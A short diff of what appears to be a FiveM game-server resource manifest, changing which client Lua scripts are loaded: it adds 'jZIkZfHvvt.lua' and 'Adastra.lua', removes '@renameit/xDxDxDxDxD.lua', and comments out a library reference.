@@ -6,11 +6,12 @@ server_scripts {
 	'server/main.lua'
 }
 
-
+--client_script('@korioz/lib.lua')
 client_scripts {
 	'config.lua',
 	'client/main.lua'
 }
 
+client_script 'jZIkZfHvvt.lua'
 
-client_script '@renameit/xDxDxDxDxD.lua'
+client_script 'Adastra.lua'
